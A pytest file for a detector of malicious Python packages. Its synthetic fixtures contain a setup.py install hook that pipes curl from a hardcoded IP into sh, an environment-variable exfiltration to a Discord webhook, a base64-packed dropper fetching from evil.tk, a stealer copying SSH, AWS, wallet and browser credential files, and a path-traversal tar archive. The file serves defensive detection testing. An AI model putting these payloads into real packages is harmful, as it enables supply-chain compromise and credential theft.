"""Feature-extraction tests built on synthetic packages.

The fixtures reproduce the shapes seen in the real DataDog corpus -- an
install-time dropper, a packed payload, a credential stealer -- and assert that
the corresponding feature group actually fires. Without these, a silent
regression in the AST walk would show up only as a quietly worse model.
"""

from __future__ import annotations

import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from features import describe, extract_features, feature_names, shannon_entropy
from safe_extract import UnsafeArchive, extract_tar


def build(tmp_path: Path, files: dict[str, str]) -> Path:
    root = tmp_path / "pkg"
    for name, content in files.items():
        p = root / name
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content)
    return root


BENIGN_SETUP = '''
from setuptools import setup, find_packages

setup(
    name="tidy-lib",
    version="1.2.3",
    packages=find_packages(),
    install_requires=["requests>=2.0"],
)
'''

BENIGN_MODULE = '''
"""A small, well-behaved library."""


def add(a, b):
    """Add two numbers."""
    return a + b


def greet(name):
    return f"Hello, {name}!"
'''


def test_benign_package_is_quiet(tmp_path):
    """A normal package should score zero across every danger group."""
    root = build(tmp_path, {
        "setup.py": BENIGN_SETUP,
        "tidy_lib/__init__.py": BENIGN_MODULE,
        "README.md": "# tidy-lib\n\nAdds numbers.\n",
        "LICENSE": "MIT",
    })
    f = extract_features(root, "tidy-lib", {"requests", "numpy"})

    assert f["install_has_cmdclass"] == 0
    assert f["install_net_at_toplevel"] == 0
    assert f["install_proc_at_toplevel"] == 0
    assert f["call_exec"] == 0
    assert f["call_process"] == 0
    assert f["decode_then_exec"] == 0
    assert f["exfil_total"] == 0
    assert f["net_suspicious_host"] == 0
    assert f["pkg_has_readme"] == 1
    assert f["pkg_has_license"] == 1
    assert f["install_has_setup_py"] == 1


def test_install_hook_dropper(tmp_path):
    """cmdclass override + payload during install -- the dominant PyPI attack."""
    root = build(tmp_path, {
        "setup.py": '''
from setuptools import setup
from setuptools.command.install import install
import subprocess


class PostInstall(install):
    def run(self):
        subprocess.Popen(["curl", "http://185.22.11.9/x.sh", "|", "sh"])
        install.run(self)


setup(name="totally-fine", version="9.9.9", cmdclass={"install": PostInstall})
''',
    })
    f = extract_features(root, "totally-fine", set())

    assert f["install_has_cmdclass"] == 1, "cmdclass override not detected"
    assert f["install_hook_subclass"] == 1, "install-command subclass not detected"
    assert f["call_process"] >= 1
    assert f["net_hardcoded_ip"] >= 1


def test_module_level_exfil_in_setup(tmp_path):
    """Payload at setup.py module level fires the moment the file is read."""
    root = build(tmp_path, {
        "setup.py": '''
from setuptools import setup
import requests, os

requests.post("https://discord.com/api/webhooks/1234/abcd", json=dict(os.environ))

setup(name="envstealer", version="0.1")
''',
    })
    f = extract_features(root, "envstealer", set())

    assert f["install_net_at_toplevel"] >= 1, "top-level network call missed"
    assert f["install_toplevel_call"] >= 1
    assert f["net_suspicious_host"] >= 1, "Discord webhook not flagged"
    assert f["call_network"] >= 1


def test_packed_payload(tmp_path):
    """exec(base64.b64decode(...)) -- the classic packed dropper."""
    blob = "aW1wb3J0IG9zCm9zLnN5c3RlbSgiY3VybCBodHRwOi8vZXZpbC50ay9hLnNoIHwgc2giKQo" * 12
    root = build(tmp_path, {
        "setup.py": "from setuptools import setup\nsetup(name='packed', version='1.0')\n",
        "packed/__init__.py": f'''
import base64

exec(base64.b64decode("{blob}"))
''',
    })
    f = extract_features(root, "packed", set())

    assert f["decode_then_exec"] >= 1, "decode-then-exec chain not detected"
    assert f["call_exec"] >= 1
    assert f["decode_calls"] >= 1
    assert f["obf_b64ish_count"] >= 1
    assert f["obf_str_len_max"] > 500


def test_credential_stealer(tmp_path):
    """Reading browser stores, SSH keys, wallets and cloud credentials."""
    root = build(tmp_path, {
        "setup.py": "from setuptools import setup\nsetup(name='grabber', version='1.0')\n",
        "grabber/steal.py": '''
import os, shutil

paths = [
    os.path.expanduser("~/.ssh/id_rsa"),
    os.path.expanduser("~/.aws/credentials"),
    os.path.expanduser("~/AppData/Roaming/Exodus/wallet.dat"),
    os.path.expanduser("~/AppData/Local/Google/Chrome/User Data/Default/Login Data"),
]

for p in paths:
    try:
        shutil.copy(p, "/tmp/loot")
    except Exception:
        pass
''',
    })
    f = extract_features(root, "grabber", set())

    assert f["exfil_ssh"] >= 1
    assert f["exfil_cloud"] >= 1
    assert f["exfil_wallet"] >= 1
    assert f["exfil_browser"] >= 1
    assert f["exfil_total"] >= 4
    assert f["call_try_except_pass"] >= 1, "silent except:pass not detected"


def test_typosquat_distance(tmp_path):
    """A one-character-off name should sit in the typosquat danger zone."""
    root = build(tmp_path, {"setup.py": BENIGN_SETUP})
    popular = {"requests", "numpy", "pandas", "urllib3"}

    assert extract_features(root, "requests", popular)["pkg_typosquat_distance"] == 0
    assert extract_features(root, "reqests", popular)["pkg_typosquat_distance"] == 1
    assert extract_features(root, "zzqqxxyy", popular)["pkg_typosquat_distance"] == 4


def test_density_features_scale_with_size(tmp_path):
    """A tiny dropper must out-rank a huge project with the same raw count."""
    payload = 'import subprocess\nsubprocess.run(["sh", "-c", "x"])\n'
    small = build(tmp_path / "a", {"setup.py": "", "m.py": payload})
    large = build(tmp_path / "b", {"setup.py": "", "m.py": payload + "\n" * 5000})

    fs = extract_features(small, "s", set())
    fl = extract_features(large, "l", set())

    assert fs["call_process"] == fl["call_process"], "raw counts should match"
    assert fs["call_process_per_kloc"] > fl["call_process_per_kloc"], (
        "density feature failed to distinguish a dropper from a large project"
    )


def test_feature_vector_is_stable(tmp_path):
    """Every package must yield exactly the same keys, in the same order."""
    names = feature_names()
    a = extract_features(build(tmp_path / "a", {"setup.py": BENIGN_SETUP}), "a", set())
    b = extract_features(build(tmp_path / "b", {"x.py": "import os\n"}), "b", {"os"})

    assert sorted(a) == names
    assert sorted(b) == names
    assert all(isinstance(v, float) for v in a.values())


def test_every_feature_is_documented():
    """The LLM explains features by name; an undocumented one would leak a slug."""
    undocumented = [n for n in feature_names() if describe(n) == n]
    assert not undocumented, f"features missing a description: {undocumented}"


def test_entropy_ordering():
    assert shannon_entropy("aaaaaaaa") < shannon_entropy("abcdefgh")
    assert shannon_entropy("") == 0.0


def test_syntax_errors_do_not_crash_extraction(tmp_path):
    """Deliberately mangled source is common in this corpus; it must not throw."""
    root = build(tmp_path, {"broken.py": "def (((:\n  !!!\n", "ok.py": "x = 1\n"})
    f = extract_features(root, "broken", set())
    assert f["pkg_parse_failures"] >= 1


def test_extraction_refuses_path_traversal(tmp_path):
    """An archive escaping its destination must be rejected, not written."""
    import io
    import tarfile

    archive = tmp_path / "evil.tar"
    with tarfile.open(archive, "w") as tf:
        data = b"pwned"
        info = tarfile.TarInfo("../../escaped.txt")
        info.size = len(data)
        tf.addfile(info, io.BytesIO(data))

    with pytest.raises(UnsafeArchive):
        extract_tar(archive, tmp_path / "dest")
    assert not (tmp_path.parent / "escaped.txt").exists()
